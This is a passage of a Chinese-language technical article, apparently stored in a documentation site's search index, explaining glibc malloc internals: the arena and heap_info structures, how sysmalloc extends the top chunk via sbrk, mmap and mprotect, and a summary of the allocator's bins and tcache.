\u200b\u7684\u200b\u6570\u91cf\u200b\u6709\u200b\u9650\u5236\u200b\uff0c\u200b\u5728\u200b 64 \u200b\u4f4d\u200b\u7cfb\u7edf\u200b\u4e0b\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u6570\u91cf\u200b\u9650\u5236\u200b\u662f\u200b\u5904\u7406\u5668\u200b\u6838\u5fc3\u200b\u6570\u200b\u7684\u200b 8 \u200b\u500d\u200b\uff0c\u200b\u907f\u514d\u51fa\u73b0\u200b\u592a\u591a\u200b\u7684\u200b\u5185\u5b58\u200b\u788e\u7247\u200b</li> <li>heap \u200b\u5c42\u6b21\u200b\uff1a\u200b\u6bcf\u4e2a\u200b heap \u200b\u5927\u5c0f\u200b\u6709\u200b\u4e0a\u9650\u200b\uff1a<code>1024 * 1024</code> \u200b\u5b57\u8282\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 1MB\uff1b\u200b\u5f53\u200b arena \u200b\u9700\u8981\u200b\u66f4\u200b\u591a\u200b\u7a7a\u95f4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5206\u914d\u200b\u65b0\u200b\u7684\u200b heap\uff1barena \u200b\u81ea\u8eab\u200b\u5c31\u200b\u4fdd\u5b58\u200b\u5728\u200b arena \u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b heap \u200b\u5185\u90e8\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b arena \u200b\u7684\u200b\u591a\u4e2a\u200b heap \u200b\u4e4b\u95f4\u200b\u901a\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u8fde\u63a5\u8d77\u6765\u200b\uff1barena \u200b\u7684\u200b top chunk \u200b\u6307\u5411\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u521b\u5efa\u200b\u7684\u200b heap \u200b\u7684\u200b\u9876\u90e8\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b</li> </ol> <p>arena \u200b\u7684\u200b\u7ed3\u6784\u200b\u5c31\u662f\u200b\u524d\u9762\u200b\u770b\u5230\u200b\u7684\u200b <code>malloc_state</code>\uff0c\u200b\u5305\u62ec\u200b\u5982\u4e0b\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <pre><code>struct malloc_state\n{\n  /* Serialize access.  */\n  __libc_lock_define (, mutex);\n\n  /* Flags (formerly in max_fast).  */\n  int flags;\n\n  /* Set if the fastbin chunks contain recently inserted free blocks.  */\n  /* Note this is a bool but not all targets support atomics on booleans.  */\n  int have_fastchunks;\n\n  /* Fastbins */\n  mfastbinptr fastbinsY[NFASTBINS];\n\n  /* Base of the topmost chunk -- not otherwise kept in a bin */\n  mchunkptr top;\n\n  /* The remainder from the most recent split of a small request */\n  mchunkptr last_remainder;\n\n  /* Normal bins packed as described above */\n  mchunkptr bins[NBINS * 2 - 2];\n\n  /* Bitmap of bins */\n  unsigned int binmap[BINMAPSIZE];\n\n  /* Linked list */\n  struct malloc_state *next;\n\n  /* Linked list for free arenas.  Access to this field is serialized\n     by free_list_lock in arena.c.  */\n  struct malloc_state *next_free;\n\n  /* Number of threads attached to this arena.  0 if the arena is on\n     the free list.  Access to this field is serialized by\n     free_list_lock in arena.c.  */\n  INTERNAL_SIZE_T attached_threads;\n\n  /* Memory allocated from the system in this arena.  */\n  INTERNAL_SIZE_T system_mem;\n  INTERNAL_SIZE_T max_system_mem;\n};\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u5f88\u591a\u200b\u5b57\u6bb5\u200b\u5728\u200b\u4e4b\u524d\u200b\u5df2\u7ecf\u200b\u89c1\u200b\u8fc7\u200b\u4e86\u200b\uff0c\u200b\u6bd4\u5982\u200b\uff1a</p> <ol> <li><code>mutex</code>\uff1aarena \u200b\u7684\u200b\u4e92\u65a5\u200b\u9501\u200b</li> <li><code>have_fastchunks</code>\uff1a\u200b\u8bb0\u5f55\u200b fast bin \u200b\u4e2d\u200b\u662f\u5426\u200b\u8fd8\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5224\u65ad\u200b\u662f\u5426\u200b\u9700\u8981\u200b consolidate</li> <li><code>fastbinsY</code>\uff1a\u200b\u4fdd\u5b58\u200b fast bin \u200b\u6bcf\u4e2a\u200b bin \u200b\u7684\u200b\u5934\u200b\u6307\u9488\u200b\u7684\u200b\u6570\u7ec4\u200b</li> <li><code>top</code>\uff1a\u200b\u6307\u5411\u200b top chunk</li> <li><code>last_remainder</code>\uff1a\u200b\u6307\u5411\u200b\u6700\u8fd1\u200b\u4e00\u6b21\u200b split \u200b\u51fa\u6765\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u7528\u4e8e\u200b\u8bbf\u5b58\u200b\u5c40\u90e8\u6027\u200b\u4f18\u5316\u200b</li> <li><code>bins</code>\uff1a\u200b\u4fdd\u5b58\u200b unsorted bin\uff0csmall bin \u200b\u548c\u200b large bin \u200b\u5404\u4e2a\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u7684\u200b\u54e8\u5175\u200b\u7ed3\u70b9\u200b\u7684\u200b <code>fd</code> \u200b\u548c\u200b <code>bk</code> \u200b\u6307\u9488\u200b</li> <li><code>binmap</code>\uff1a\u200b\u8bb0\u5f55\u200b\u54ea\u4e9b\u200b small \u200b\u6216\u200b large bin \u200b\u91cc\u9762\u200b\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u7528\u4e8e\u200b\u52a0\u901f\u200b\u5bfb\u627e\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b bin</li> </ol> <p>\u200b\u4e4b\u524d\u200b\u6ca1\u6709\u200b\u6d89\u53ca\u200b\u5230\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u5305\u62ec\u200b\uff1a</p> <ol> <li><code>flags</code>: \u200b\u7ef4\u62a4\u200b <code>NONCONTIGUOUS_BIT</code> \u200b\u6807\u8bb0\u200b\uff0c\u200b\u5373\u200b arena \u200b\u6240\u200b\u4f7f\u7528\u200b\u7684\u200b\u5185\u5b58\u200b\u662f\u5426\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b\uff0c\u200b\u4f8b\u5982\u200b\u7528\u200b sbrk \u200b\u5206\u914d\u200b\u51fa\u6765\u200b\u7684\u200b\u5185\u5b58\u200b\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b\uff0c\u200b\u7528\u200b mmap \u200b\u5219\u200b\u4e0d\u662f\u200b</li> <li><code>next</code>: \u200b\u7ef4\u62a4\u200b\u6240\u6709\u200b arena \u200b\u7684\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\uff0c\u200b\u94fe\u8868\u200b\u5934\u200b\u5c31\u662f\u200b <code>main_arena</code></li> <li><code>next_free</code>: \u200b\u7ef4\u62a4\u200b\u6240\u6709\u200b\u7a7a\u95f2\u200b\u7684\u200b arena \u200b\u7684\u200b\u5355\u5411\u200b\u94fe\u8868\u200b free list\uff0c\u200b\u94fe\u8868\u200b\u5934\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>static mstate free_list</code></li> <li><code>attached_threads</code>: \u200b\u8bb0\u5f55\u200b\u6709\u200b\u591a\u5c11\u200b\u4e2a\u200b\u7ebf\u7a0b\u200b\u4f1a\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b arena\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u4e00\u79cd\u200b\u5f15\u7528\u200b\u8ba1\u6570\u200b\uff0c\u200b\u5f53\u200b\u5b83\u200b\u51cf\u5230\u200b\u96f6\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u610f\u5473\u7740\u200b arena \u200b\u53ef\u4ee5\u200b\u88ab\u200b\u91ca\u653e\u200b\u5230\u200b free list \u200b\u4e86\u200b</li> <li><code>system_mem</code>: \u200b\u8bb0\u5f55\u200b\u5b83\u200b\u4ece\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5206\u914d\u200b\u4e86\u200b\u591a\u5c11\u200b\u7684\u200b\u5185\u5b58\u200b\u7684\u200b\u5927\u5c0f\u200b</li> <li><code>max_system_mem</code>\uff1a\u200b\u8bb0\u5f55\u200b\u5b83\u200b\u5386\u53f2\u200b\u4e0a\u200b\u4ece\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5206\u914d\u200b\u6700\u591a\u200b\u7684\u200b\u5185\u5b58\u200b\u7684\u200b\u5927\u5c0f\u200b</li> </ol> <p>\u200b\u53ef\u89c1\u200b arena \u200b\u7684\u200b\u7ed3\u6784\u200b\u8fd8\u662f\u200b\u6bd4\u8f83\u7b80\u5355\u200b\u7684\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u5206\u6790\u200b heap \u200b\u7684\u200b\u7ed3\u6784\u200b\uff1a</p> <pre><code>typedef struct _heap_info\n{\n  mstate ar_ptr; /* Arena for this heap. */\n  struct _heap_info *prev; /* Previous heap. */\n  size_t size;   /* Current size in bytes. */\n  size_t mprotect_size; /* Size in bytes that has been mprotected\n                           PROT_READ|PROT_WRITE.  */\n  /* Make sure the following data is properly aligned, particularly\n     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of\n     MALLOC_ALIGNMENT. */\n  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];\n} heap_info;\n</code></pre> <p>\u200b\u5b57\u200b\u6bb5\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li><code>ar_ptr</code>\uff1a\u200b\u6307\u5411\u200b heap \u200b\u6240\u5c5e\u200b\u7684\u200b arena</li> <li><code>prev</code>\uff1a\u200b\u6307\u5411\u200b\u524d\u200b\u4e00\u4e2a\u200b heap\uff0c\u200b\u7ec4\u6210\u200b\u4e00\u4e2a\u200b heap \u200b\u7684\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\uff0c\u200b\u65b0\u200b\u6dfb\u52a0\u200b\u7684\u200b heap \u200b\u653e\u5230\u200b\u94fe\u8868\u200b\u7684\u200b\u5c3e\u90e8\u200b</li> <li><code>size</code>: heap \u200b\u7684\u200b\u5927\u5c0f\u200b</li> <li><code>mprotect_size</code>: heap \u200b\u88ab\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u53ef\u200b\u8bfb\u5199\u200b\u7684\u200b\u90e8\u5206\u200b\u7684\u200b\u5185\u5b58\u5927\u5c0f\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b heap \u200b\u7684\u200b\u6d3b\u8dc3\u200b\u90e8\u5206\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5bf9\u9f50\u200b\u5230\u200b\u9875\u200b\u7684\u200b\u8fb9\u754c\u200b\uff1b\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cheap \u200b\u7684\u200b\u672a\u200b\u5206\u914d\u200b\u7a7a\u95f4\u200b\u88ab\u200b\u6620\u5c04\u200b\u4e3a\u200b\u4e0d\u53ef\u200b\u8bfb\u200b\u4e0d\u53ef\u200b\u5199\u200b\u4e0d\u53ef\u200b\u6267\u884c\u200b\u7684\u200b\u5c5e\u6027\u200b</li> <li><code>pad</code>: \u200b\u6dfb\u52a0\u200b padding\uff0c\u200b\u4fdd\u8bc1\u200b\u5b83\u200b\u7684\u200b\u5927\u5c0f\u200b\u662f\u200b <code>MALLOC_ALIGNMENT</code> \u200b\u7684\u200b\u500d\u6570\u200b</li> </ol> <p>\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\u8fc7\u200b\uff0carena \u200b\u7684\u200b\u7a7a\u95f4\u200b\u4f1a\u200b\u590d\u7528\u200b\u5b83\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b heap \u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u7d27\u63a5\u7740\u200b\u653e\u5728\u200b <code>heap_info</code> \u200b\u7ed3\u6784\u200b\u4f53\u200b\u7684\u200b\u540e\u9762\u200b\u3002\u200b\u8fd9\u4e2a\u200b <code>heap_info</code> \u200b\u7ed3\u6784\u200b\u4f53\u200b\u5c31\u200b\u653e\u5728\u200b heap \u200b\u6240\u7528\u200b\u7a7a\u95f4\u200b\u7684\u200b\u5f00\u5934\u200b\u3002</p> <p>heap \u200b\u6709\u200b\u4e00\u4e2a\u200b\u7279\u6027\u200b\uff0c\u200b\u5c31\u662f\u200b\u5b83\u200b\u7684\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\uff0c\u200b\u4e00\u5b9a\u200b\u662f\u200b\u5bf9\u9f50\u200b\u5230\u200b <code>HEAP_MAX_SIZE</code>\uff08\u200b\u9ed8\u8ba4\u200b\u662f\u200b 64MB\uff09\u200b\u7684\u200b\u6574\u6570\u200b\u500d\u6570\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5b83\u200b\u7684\u200b\u5927\u5c0f\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u8d85\u8fc7\u200b <code>HEAP_MAX_SIZE</code>\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u8981\u200b\u77e5\u9053\u200b\u67d0\u4e2a\u200b chunk \u200b\u5c5e\u4e8e\u200b\u54ea\u4e2a\u200b heap\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u5411\u4e0b\u200b\u53d6\u6574\u200b\u5230\u200b <code>HEAP_MAX_SIZE</code> \u200b\u7684\u200b\u500d\u6570\u200b\u5373\u53ef\u200b\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u77e5\u9053\u200b\u67d0\u4e2a\u200b chunk \u200b\u5c5e\u4e8e\u200b\u54ea\u4e2a\u200b arena\uff0c\u200b\u5c31\u200b\u5148\u200b\u627e\u5230\u200b heap\uff0c\u200b\u518d\u200b\u4ece\u200b heap_info \u200b\u83b7\u53d6\u200b ar_ptr \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e86\u200b\u3002</p> <p>\u200b\u6bd4\u8f83\u200b\u6709\u610f\u601d\u200b\u7684\u200b\u4e00\u4e2a\u70b9\u200b\u662f\u200b\uff0cheap \u200b\u4fdd\u5b58\u200b\u4e86\u200b arena \u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u4f46\u662f\u200b\u53cd\u8fc7\u6765\u200b\uff0carena \u200b\u5e76\u200b\u6ca1\u6709\u200b\u4fdd\u5b58\u200b heap \u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u90a3\u4e48\u200b\u600e\u4e48\u200b\u4ece\u200b arena \u200b\u627e\u5230\u200b\u5c5e\u4e8e\u200b\u8fd9\u4e2a\u200b arena \u200b\u7684\u200b\u6240\u6709\u200b heap \u200b\u5462\u200b\uff1f\u200b\u8fd9\u4f1a\u200b\u7528\u5230\u200b\u4e00\u4e2a\u200b\u6027\u8d28\u200b\uff1aarena \u200b\u7684\u200b top \u200b\u6c38\u8fdc\u200b\u6307\u5411\u200b\u6700\u65b0\u200b\u7684\u200b\u4e00\u4e2a\u200b heap \u200b\u7684\u200b\u5730\u5740\u200b\u6700\u9ad8\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u800c\u200b\u8fd9\u4e2a\u200b\u6700\u65b0\u200b\u7684\u200b heap \u200b\u6b63\u597d\u200b\u5904\u4e8e\u200b heap \u200b\u94fe\u8868\u200b\u7684\u200b\u5c3e\u90e8\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u8981\u200b\u904d\u5386\u200b arena \u200b\u91cc\u200b\u7684\u200b heap\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u83b7\u53d6\u200b arena \u200b\u7684\u200b top \u200b\u6307\u9488\u200b</li> <li>\u200b\u628a\u200b top \u200b\u6307\u9488\u200b\u5411\u4e0b\u200b\u53d6\u6574\u200b\u5230\u200b <code>HEAP_MAX_SIZE</code> \u200b\u7684\u200b\u6574\u200b\u500d\u6570\u200b\uff0c\u200b\u5f97\u5230\u200b top \u200b\u6240\u5728\u200b heap \u200b\u7684\u200b heap_info \u200b\u6307\u9488\u200b</li> <li>\u200b\u6cbf\u7740\u200b heap_info \u200b\u7684\u200b prev \u200b\u6307\u9488\u200b\u5411\u524d\u8d70\u200b\uff0c\u200b\u4e00\u76f4\u200b\u904d\u5386\u200b\uff0c\u200b\u76f4\u5230\u200b prev \u200b\u6307\u9488\u200b\u4e3a\u200b NULL \u200b\u4e3a\u6b62\u200b</li> </ol> <p>\u200b\u6240\u4ee5\u200b top \u200b\u6307\u9488\u200b\u4e5f\u200b\u5145\u5f53\u200b\u4e86\u200b heap \u200b\u94fe\u8868\u200b\u7684\u200b\u5c3e\u200b\u6307\u9488\u200b\u7684\u200b\u4f5c\u7528\u200b\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\u89c2\u5bdf\u200b arena \u200b\u548c\u200b heap \u200b\u662f\u200b\u600e\u4e48\u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u3002</p> <p>main arena \u200b\u662f\u200b\u7279\u6b8a\u200b\u7684\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u76f4\u63a5\u200b\u4fdd\u5b58\u200b\u5728\u200b glibc \u200b\u7684\u200b data \u200b\u6bb5\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e0d\u200b\u9700\u8981\u200b\u52a8\u6001\u5206\u914d\u200b\uff0c\u200b\u5e76\u4e14\u200b main arena \u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b\u901a\u8fc7\u200b sbrk \u200b\u4ece\u200b\u7cfb\u7edf\u200b\u5206\u914d\u200b\u7684\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u7ef4\u62a4\u200b\u903b\u8f91\u200b\u5728\u200b <code>sysmalloc</code> \u200b\u51fd\u6570\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\uff1a\u200b\u5f53\u200b malloc \u200b\u5c1d\u8bd5\u200b\u5404\u79cd\u200b\u529e\u6cd5\u200b\u90fd\u200b\u627e\u200b\u4e0d\u5230\u200b\u7a7a\u95f4\u200b\u5206\u914d\u200b\u65f6\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u8c03\u7528\u200b <code>sysmalloc</code> \u200b\u6765\u200b\u6269\u5c55\u200b top chunk \u200b\u5e76\u200b\u4ece\u200b top chunk \u200b\u4e2d\u200b\u5206\u914d\u200b\u65b0\u200b\u7684\u200b\u5757\u200b\u3002\u200b\u5f53\u200b <code>sysmalloc</code> \u200b\u9047\u5230\u200b main arena \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u7528\u200b sbrk \u200b\u6269\u5c55\u200b\u5806\u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u4ece\u800c\u200b\u6269\u5927\u200b top chunk\u3002\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0csbrk \u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5931\u8d25\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u65f6\u5019\u200b main arena \u200b\u4e5f\u200b\u4f1a\u200b\u901a\u8fc7\u200b mmap \u200b\u6765\u200b\u5206\u914d\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u5185\u5b58\u200b\u3002</p> <p>\u200b\u5176\u4ed6\u200b\u7684\u200b arena \u200b\u5219\u200b\u662f\u200b\u901a\u8fc7\u200b <code>_int_new_arena</code> \u200b\u5206\u914d\u200b\u7684\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u6d41\u7a0b\u200b\u662f\u200b\uff1a</p> <ol> <li>\u200b\u8c03\u7528\u200b <code>new_heap</code> \u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u5806\u200b\uff0c\u200b\u81f3\u5c11\u200b\u80fd\u591f\u200b\u653e\u200b <code>heap_info</code> \u200b\u548c\u200b <code>malloc_state</code> \u200b\u7684\u200b\u7a7a\u95f4\u200b</li> <li>\u200b\u8fd9\u200b\u6bb5\u200b\u7a7a\u95f4\u200b\u7684\u200b\u5f00\u5934\u200b\u5c31\u662f\u200b <code>heap_info</code>\uff0c\u200b\u7d27\u968f\u5176\u540e\u200b\u5c31\u662f\u200b arena \u200b\u81ea\u5df1\u200b\u7684\u200b <code>malloc_state</code>\uff0c\u200b\u7136\u540e\u200b\u628a\u200b top chunk \u200b\u6307\u5411\u200b <code>malloc_state</code> \u200b\u540e\u9762\u200b\u7684\u200b\u7a7a\u95f2\u200b\u7a7a\u95f4\u200b</li> </ol> <p><code>new_heap</code> \u200b\u5219\u200b\u662f\u200b\u4f1a\u200b\u901a\u8fc7\u200b <code>mmap</code> \u200b\u5411\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7533\u8bf7\u200b\u5185\u5b58\u200b\u3002\u200b\u56e0\u6b64\u200b\u9664\u4e86\u200b main_arena \u200b\u4ee5\u5916\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b arena \u200b\u7684\u200b heap \u200b\u90fd\u200b\u4f1a\u200b\u653e\u5728\u200b mmap \u200b\u51fa\u6765\u200b\u7684\u200b\u7a7a\u95f4\u200b\u91cc\u200b\u3002</p> <p>\u200b\u4e8e\u662f\u200b <code>sysmalloc</code> \u200b\u8981\u200b\u505a\u200b\u7684\u200b\u4e8b\u60c5\u200b\u4e5f\u200b\u6bd4\u8f83\u200b\u6e05\u6670\u200b\u4e86\u200b\uff0c\u200b\u5b83\u200b\u8981\u200b\u505a\u200b\u7684\u200b\u5c31\u662f\u200b\uff0c\u200b\u5728\u200b top chunk \u200b\u4e0d\u591f\u200b\u5927\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5206\u914d\u200b\u66f4\u200b\u591a\u200b\u7a7a\u95f4\u200b\u7ed9\u200b top chunk\uff1a</p> <ol> <li>\u200b\u5982\u679c\u200b\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\u7279\u522b\u200b\u5927\u200b\uff0c\u200b\u8d85\u51fa\u200b\u4e86\u200b\u9608\u503c\u200b <code>mmap_threshold</code>\uff0c\u200b\u5c31\u200b\u76f4\u63a5\u200b\u7528\u200b mmap \u200b\u7533\u8bf7\u200b\u5185\u5b58\u200b</li> <li>\u200b\u5982\u679c\u200b\u4e0d\u662f\u200b main arena\uff0c\u200b\u5c31\u200b\u5c1d\u8bd5\u200b\u6269\u5927\u200b top \u200b\u6240\u5728\u200b\u7684\u200b heap\uff1aheap \u200b\u5728\u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u867d\u7136\u200b\u4f1a\u200b mmap \u200b\u4e00\u4e2a\u200b <code>HEAP_MAX_SIZE</code> \u200b\u5927\u5c0f\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u4f46\u200b\u5927\u90e8\u5206\u200b\u7a7a\u95f4\u200b\u90fd\u200b\u88ab\u200b\u6620\u5c04\u200b\u4e3a\u200b\u4e0d\u53ef\u200b\u8bfb\u200b\u4e0d\u53ef\u200b\u5199\u200b\u4e0d\u53ef\u200b\u6267\u884c\u200b\uff1b\u200b\u6240\u4ee5\u200b\u6269\u5927\u200b heap\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u628a\u200b\u8981\u200b\u7528\u200b\u7684\u200b\u90e8\u5206\u200b\u901a\u8fc7\u200b mprotect \u200b\u6dfb\u52a0\u200b\u53ef\u8bfb\u200b\u548c\u200b\u53ef\u200b\u5199\u200b\u7684\u200b\u6743\u9650\u200b\uff1b\u200b\u5982\u679c\u200b heap \u200b\u8fbe\u5230\u200b\u4e86\u200b\u5927\u5c0f\u200b\u7684\u200b\u4e0a\u9650\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u65b0\u5efa\u200b\u4e00\u4e2a\u200b heap\uff0c\u200b\u628a\u200b top chunk \u200b\u653e\u5230\u200b\u65b0\u200b\u7684\u200b heap \u200b\u4e0a\u53bb\u200b</li> <li>\u200b\u5982\u679c\u200b\u662f\u200b main arena\uff0c\u200b\u5c31\u200b\u7528\u200b sbrk \u200b\u6269\u5927\u200b top chunk\uff1b\u200b\u5982\u679c\u200b\u6269\u5927\u200b\u5931\u8d25\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u7528\u200b mmap \u200b\u6765\u200b\u5206\u914d\u5185\u5b58\u200b</li> </ol>"},{"location":"software/glibc_allocator.html#_4","title":"\u5c0f\u7ed3","text":""},{"location":"software/glibc_allocator.html#_5","title":"\u7ed3\u6784","text":"<p>\u200b\u5230\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u57fa\u672c\u200b\u628a\u200b glibc \u200b\u7684\u200b\u5185\u5b58\u200b\u5206\u914d\u5668\u200b\u5206\u6790\u200b\u5f97\u200b\u5dee\u4e0d\u591a\u200b\u4e86\u200b\u3002glibc \u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u653e\u5728\u200b\u5982\u4e0b\u200b\u56db\u79cd\u200b bin \u200b\u5185\u200b\uff1a</p> <ol> <li>fast bin: \u200b\u6bcf\u4e2a\u200b bin \u200b\u5bf9\u5e94\u200b\u56fa\u5b9a\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u7528\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u7ef4\u62a4\u200b\uff0c\u200b\u94fe\u8868\u200b\u5934\u200b\u6307\u9488\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>malloc_state</code> \u200b\u7684\u200b <code>fastbinsY</code> \u200b\u6210\u5458\u200b</li> <li>unsorted bin: \u200b\u4e00\u4e2a\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\uff0c\u200b\u7ef4\u62a4\u200b\u4e00\u4e9b\u200b\u521a\u200b\u88ab\u200b free \u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u65e0\u200b\u5927\u5c0f\u200b\u8981\u6c42\u200b\uff0c\u200b\u94fe\u8868\u200b\u7684\u200b\u54e8\u5175\u200b\u7ed3\u70b9\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>malloc_state</code> \u200b\u7684\u200b <code>bins</code> \u200b\u6210\u5458\u200b\u521a\u200b\u5f00\u5934\u200b</li> <li>small bin: \u200b\u6bcf\u4e2a\u200b bin \u200b\u5bf9\u5e94\u200b\u56fa\u5b9a\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u7528\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u7ef4\u62a4\u200b\uff0c\u200b\u94fe\u8868\u200b\u7684\u200b\u54e8\u5175\u200b\u7ed3\u70b9\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>malloc_state</code> \u200b\u7684\u200b <code>bins</code> \u200b\u6210\u5458\u200b\uff0c\u200b\u7d27\u63a5\u5728\u200b unsorted bin \u200b\u540e\u9762\u200b</li> <li>large bin: \u200b\u6bcf\u4e2a\u200b bin \u200b\u5bf9\u5e94\u200b\u4e00\u6bb5\u200b\u5927\u5c0f\u200b\u8303\u56f4\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u7528\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u7ef4\u62a4\u200b\uff0c\u200b\u6309\u7167\u200b\u5757\u200b\u5927\u5c0f\u200b\u4ece\u5927\u5230\u200b\u5c0f\u200b\u6392\u5e8f\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5927\u5c0f\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5728\u200b nextsize \u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u94fe\u8868\u200b\u7684\u200b\u54e8\u5175\u200b\u7ed3\u70b9\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>malloc_state</code> \u200b\u7684\u200b <code>bins</code> \u200b\u6210\u5458\u200b\u4e2d\u200b\uff0c\u200b\u7d27\u63a5\u5728\u200b small bin \u200b\u540e\u9762\u200b</li> </ol> <p>\u200b\u9664\u4e86\u200b\u8fd9\u200b\u56db\u79cd\u200b bin \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b per thread \u200b\u7684\u200b tcache \u200b\u673a\u5236\u200b\uff0c\u200b\u7ed3\u6784\u200b\u548c\u200b fast bin \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u6bcf\u4e2a\u200b bin \u200b\u5bf9\u5e94\u200b\u56fa\u5b9a\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u7528\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u7ef4\u62a4\u200b\uff0c\u200b\u94fe\u8868\u200b\u5934\u200b\u6307\u9488\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>tcache</code> \u200b\u7684\u200b <code>entries</code> \u200b\u6210\u5458\u200b\u3002</p> <p>\u200b\u5185\u200b\u5b58\u5728\u200b\u5206\u914d\u5668\u200b\u4e2d\u200b\u6d41\u8f6c\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u5927\u81f4\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u4e00\u200b\u5f00\u59cb\u200b\u4ece\u200b top 